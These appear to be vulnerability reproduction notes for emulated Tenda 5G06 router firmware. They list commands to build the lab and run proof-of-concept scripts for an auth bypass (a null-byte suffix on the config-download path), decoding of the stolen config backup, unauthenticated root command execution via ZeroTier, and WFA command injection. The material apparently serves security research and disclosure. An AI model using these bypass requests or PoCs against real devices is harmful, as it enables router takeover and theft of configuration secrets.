# Reproduction Notes

## Environment

The lab uses Docker plus QEMU user-mode emulation. The tested image is an
aarch64 OpenWrt rootfs extracted from the Tenda 5G06 firmware archive.

Host dependencies:

```text
docker
curl
python3
openssl
```

The Docker image installs the remaining analysis/runtime dependencies,
including `qemu-user-static`, `squashfs-tools`, `binwalk`, `jq`, `strace`, and
cross-gcc for the local HTTP shim.

## Native Web Runtime

```bash
make download-5g06
make verify-firmware
make build
make launch-native
```

Open:

```text
http://127.0.0.1:18080/
```

Complete first-run setup and set a password before testing auth-bypass behavior.
When the runtime is still first-run/unconfigured, some protected routes can
return `200` directly. The clean auth-bypass demonstration requires:

```text
quickset_cfg=0
userpass=<non-empty md5>
```

The password-configured validation used `Tenda_888888`.

## Web PoCs

Config backup download and decode:

```bash
python3 pocs/poc_auth_bypass_download_cfg.py \
  --target http://127.0.0.1:18080 \
  --out poc_out/download_cfg_noauth.bin \
  --decode-dir poc_out/download_cfg_decoded
```

Expected configured-state behavior:

```text
GET /cgi-bin/DownloadCfg       -> 302 /login.html
GET /cgi-bin/DownloadCfg%00.js -> 200 config backup
```

ZeroTier archive execution:

```bash
python3 pocs/poc_zerotier_unauth_rce.py \
  --target http://127.0.0.1:18080 \
  --container tenda-b104-native-httpd
```

Expected result:

```text
marker=ZEROTIER_POC_RCE
id=uid=0(root) gid=0(root) groups=0(root)
```

## rc.d / WFA Runtime

The WFA/Sigma finding is easiest to reproduce with the rc.d-style boot helper:

```bash
make launch-rcd
python3 pocs/poc_wfa_direct_dut_cmd_injection.py
```

The helper starts a close-to-boot services walk and leaves the container running
for inspection. The default container name is:

```text
tenda-5g06-rcd-procd
```

## Config Backup Decode Only

Given an encrypted backup blob:

```bash
tools/decode_tenda_config_backup.sh poc_out/download_cfg_noauth.bin decoded/config
```

The decoder verifies the embedded MD5 and extracts the gzip tarball. Treat the
output as sensitive.
